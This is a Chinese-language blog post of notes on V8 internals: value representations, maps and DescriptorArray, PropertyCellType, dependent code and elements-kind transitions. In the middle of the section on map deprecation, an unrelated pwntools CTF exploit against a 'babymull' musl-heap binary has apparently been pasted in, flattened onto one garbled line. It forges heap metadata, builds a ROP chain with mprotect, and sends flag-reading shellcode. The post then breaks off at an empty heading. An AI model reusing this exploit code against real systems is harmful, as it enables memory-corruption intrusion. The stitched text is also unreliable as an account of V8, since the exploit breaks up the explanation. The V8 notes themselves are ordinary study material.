---
layout: post
title: "v8 basic"
date: 2022-06-14 13:00:20 +0800
categories: v8
typora-root-url: ./..
---
在js引擎中，属性访问是一项非常复杂的工作，涉及到了原型链查找，interceptor，field tracking等非常多的机制，在这里进行一个归纳与总结

## representation

代表一个对象在内存中的存储方式，以格的形式设计

![image-20230613225217526](/imgs/image-20230613225217526.png)

Smi为31位整数，HeapObject为任意在堆上的对象指针，Double较为特别，分为在堆上的MutableHeapNumber结构指针和直接存储的unbox double

其中Smi转变为Double需要分配一个MutableHeapNumber存入，将Double转变为Tagged需要将MutableHeapNumber转换为HeapNumber

Smi到Tagged以及HeapObject到Tagged可以无需修改对象，这也是in-place field representation generalization的前提。

## map

map是描述对象布局的重要结构，包含众多成员，下面选取一些重要的进行介绍

### DescriptorArray

存储对象所拥有的属性描述符，在源码中有如下注释，描述了该数组的结构

```cpp
// A DescriptorArray is a custom array that holds instance descriptors.
// It has the following layout:
//   Header:
//     [16:0  bits]: number_of_all_descriptors (including slack)   所有描述符个数，包括冗余，即容量
//     [32:16 bits]: number_of_descriptors                         已有的描述符个数
//     [64:32 bits]: raw_gc_state (used by GC)
//     [kEnumCacheOffset]: enum cache
//   Elements:
//     [kHeaderSize + 0]: first key (and internalized String)      键名，值存储在对象中，这里仅记录属性名
//     [kHeaderSize + 1]: first descriptor details (see PropertyDetails)  描述符细节，Smi类型，为Bitmap形式，对应类型PropertyDetails
//     [kHeaderSize + 2]: first value for constants / Smi(1) when not used 辅助值，可能存储字段的类型即字段的map
//   Slack:
//     [kHeaderSize + number of descriptors * 3]: start of slack
// The "value" fields store either values or field types. A field type is either
// FieldType::None(), FieldType::Any() or a weak reference to a Map. All other
// references are strong.
```

map中的instance_descriptor一般为该结构

在一些版本如2019 qwb accessible的源码中，当JSHeapBroker启用时，可能会对map进行一些缓存操作，此时的instance_descriptor为一个包含PropertyDescriptor的数组，记录一些常用信息

```cpp
struct PropertyDescriptor{
    NameData* key = nullptr; 			 // 键名
    ObjectData * value = nullptr;        // 键值
    PropertyDetails details = PropertyDetails::Empty(); // Details
    FieldIndex field_index;				 // 在DescriptorArray中的index	
    MapData* field_owner = nullptr;      // 记录属性拥有者，避免重复查找对象链
    ObjectData * filed_type = nullptr;   // 属性的类型（map）
    bool is_unboxed_double_field = false;// 
}
```

#### PropertyDetails::PropertyCellType

用于实现const field tracking，记录某个属性的可变性，针对性优化

```cpp
enum class PropertyCellType {
  kMutable,       // Cell will no longer be tracked as constant.
  kUndefined,     // The PREMONOMORPHIC of property cells.
  kConstant,      // Cell has been assigned only once.
  kConstantType,  // Cell has been assigned only one type.
  // Temporary value indicating an ongoing property cell state transition. Only
  // observable by a background thread.
  kInTransition,
  // Value for dictionaries not holding cells, must be 0:
  kNoCell = kMutable,
};
```

### dependent code

依赖数组，表示依赖当前map的编译优化代码

在编译时创建CompilationDenpendency的各种子类，如FieldTypeDependency，StableMapDependency等，实现抽象基类的Install函数，表明依赖位于某个Group中，如FieldTypeGroup，表示依赖于Map的某个FieldType，当map发生变化时，会检查新的FieldType是否变化，若有变化则Deoptimize对应Group的所有代码

在Map::GeneralizeField中可以看到一些相关的代码逻辑

### elements kind

elements数组的类型，以格形式组织，简图如下，摘自v8 blogs [Elements Kinds in V8](https://v8.dev/blog/elements-kinds)

![lattice](/imgs/lattice.svg)

当元素不能兼容类型时发生类型转换，如

```js
let a = [1,2,3]; // packed smi 
a[1] = 1.1;   //  packed double
a[2] = {};    // packed elements   (maybe recreate)
a[20] = 4;    // holey elements
```

可以使用--trace-elements-transitions flag来跟踪类型变化

```bash
elements transition [PACKED_SMI_ELEMENTS -> PACKED_DOUBLE_ELEMENTS] in ~+14 at ./test1.js:1 for 0x0ece001cc4cd <JSArray[3]> from 0x0ece0011ac7d <FixedArray[3]> to 0x0ece001cc4dd <FixedDoubleArray[3]>

elements transition [PACKED_ELEMENTS -> HOLEY_ELEMENTS] in ~+38 at ./test1.js:1 for 0x0ece001cc4cd <JSArray[3]> from 0x0ece001cc519 <FixedArray[3]> to 0x0ece001cc551 <FixedArray[47]>
```

目前最新版完整定义位于[v8](https://source.chromium.org/chromium/chromium/src/+/main:v8/)/[src](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/)/[objects](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/objects/)/[elements-kind.h](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/objects/elements-kind.h)



### map mechainism

#### map deprecate and migration

当两个对象共用一个mapA时，一个对象通过操作派生出来新的mapB，那么这时mapA被deprecate

xxxxxxxxxx from pwn import *context.arch = 'amd64'sh = process("./babymull")​size_class = [    1, 2, 3, 4, 5, 6, 7, 8,    9, 10, 12, 15,    18, 20, 25, 31,    36, 42, 50, 63,    72, 84, 102, 127,    146, 170, 204, 255,    292, 340, 409, 511,    584, 682, 818, 1023,    1169, 1364, 1637, 2047,    2340, 2730, 3276, 4095,    4680, 5460, 6552, 8191]def find_offset_fit_class(offset):    for i in range(len(size_class)):        if size_class[i] <= offset and size_class[i+1] > offset:            return i    return -1def CountTailingZero(n):    debruijn32 = [        0, 1, 23, 2, 29, 24, 19, 3, 30, 27, 25, 11, 20, 8, 4, 13,        31, 22, 28, 18, 26, 10, 7, 12, 21, 17, 9, 6, 16, 5, 15, 14    ]    return debruijn32[((n&-n)*0x076be629&0xffffffff) >> 27]def CountLeadingZero(n):    n >>= 1    n |= n >> 1    n |= n >> 2    n |= n >> 4    n |= n >> 8    n |= n >> 16    n += 1    return 31-CountTailingZero(n)def size_to_class(n):    n = (n+3)>>4    if n < 10:        return n     n += 1    i = (28-CountLeadingZero(n))*4+8    if(n > size_class[i+1]): i+= 2    if(n > size_class[i] ): i+=1    return iclass fakeMeta:    prev = 0    next = 0    mem = 0    avail_mask=0    freed_mask=0    last_idx = 0    freeable = 1    sizeclass = 0    maplen = 0    def Mask(self):        return (self.avail_mask) | (self.freed_mask << 32)    def payload(self):        Payload = p64(self.prev)        Payload += p64(self.next)        Payload += p64(self.mem)        Payload += p64(self.Mask())        flag = self.last_idx & 0x1f        flag |= (self.freeable & 1) << 5        flag |= (self.sizeclass & 0x3f) << 6        flag |= self.maplen << 12        Payload += p64(flag)        return Payload​def add(name,size,content):    sh.sendlineafter(b">> ",b'1')    sh.sendafter(b"Name: ",name)    sh.sendlineafter(b"Size: ",str(size))    sh.sendafter(b"Content: ",content)    returndef dele(idx):    sh.sendlineafter(b">> ",b'2')    sh.sendlineafter(b"Index: ",str(idx))    returndef show(idx):    sh.sendlineafter(b">> ",b'3')    sh.sendlineafter(b"Index: ",str(idx))    return def gift(write_addr,leak_addr):    sh.sendlineafter(b">> ",b'1932620593')    sh.sendline(str(write_addr))    sh.sendline(str(leak_addr))    returnfor i in range(5):    add(b'a'*0xf,0x2c,b'a'*0x2c)dele(4)add(b'fuckyou',420,b'aiofoahfio\n')​add(b'a'*0xf,0x1000,':)\n') show(5)libc_base = u64(sh.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) - 0x20 + 0x4000success('libc_base : '+hex(libc_base))libc = ELF('./libc.so')malloc_ctx = libc_base + libc.sym['__malloc_context'] success('malloc_context : '+hex(malloc_ctx))for i in range(6):    dele(i)context.log_level = 'debug'gadget = 0x4bcf3pop_rdi = 0x15536+libc_basepop_rsi = libc_base +0x1b3a9pop_rdx = libc_base + 0x177c7read_addr = libc_base + libc.sym['read']mprotect_addr = libc_base + libc.sym['mprotect']Payload = p64(0)*6Payload += p64(libc_base-0x2000+0x100) Payload += p64(pop_rdi)Payload += p64(0)Payload += p64(libc_base + gadget)Payload += p64(0) * 20Payload += p64(libc_base)Payload += p64(pop_rsi)Payload += p64(0x1000)Payload += p64(pop_rdx)Payload += p64(7)Payload += p64(mprotect_addr)Payload += p64(pop_rdi)Payload += p64(0)Payload += p64(pop_rsi)Payload += p64(libc_base)Payload += p64(pop_rdx)Payload += p64(0x200)Payload += p64(read_addr)Payload += p64(libc_base) + b'\n'add(b'fuckyou',0xa9c,Payload)  #0 add(b'fuckyou',0x1000,b'a'*0x520+p64(libc_base-0x1000+0x40)+p64(0)+p64(libc_base-0x1000+0x10)+b'\x02'+b'\x00'*7+b'cat ./flag\x00'+b'\n') # 1add(b'fuckyou',0x1000,b'a'*0xfd7+b'\x00'+p32(5)+b'\n') #2gift(libc_base-0x4a82,malloc_ctx)sh.recvuntil(b'0x')check = int(sh.recvline()[:-1],16)success("check : "+hex(check))meta = fakeMeta()meta.prev = libc_base-0x2000+0x10meta.next = libc_base + libc.sym['ofl_head']meta.mem = libc_base-0x5a90meta.last_idx = 2meta.sizeclass = find_offset_fit_class(0x100)meta.maplen = 0meta.avail_mask = 0meta.freed_mask = 5​meta1 = fakeMeta()meta1.freeable = 0meta1.mem = libc_base - 0x5aa0meta1.prev = 0meta1.next = 0meta1.last_idx = 0meta1.avail_mask = 0meta1.freed_mask = 0meta1.maplen = 0meta1.sizeclass = 2add(b'fuckyou',0xa9c,b'a'*0x550+p64(check)+b'x'*8+meta.payload()+b'x'*8+meta1.payload()+b'\n') # 3dele(2)#gdb.attach(sh)sh.sendlineafter('>> ',b'4')shellcode1 = asm('''    push 0x67616c66    mov rdi,rsp    xor esi,esi    push 2    pop rax    syscall    mov rdi,rax    mov rsi,rsp    mov edx,0x100    xor eax,eax    syscall    mov edi,1    mov rsi,rsp    push 1    pop rax    syscall    ''')sh.sendline(shellcode1)sh.interactive()​#  0x000000000004bcf3: mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]python

map deprecate一般情况下会导致dependent code被deoptimize



#### field generalization
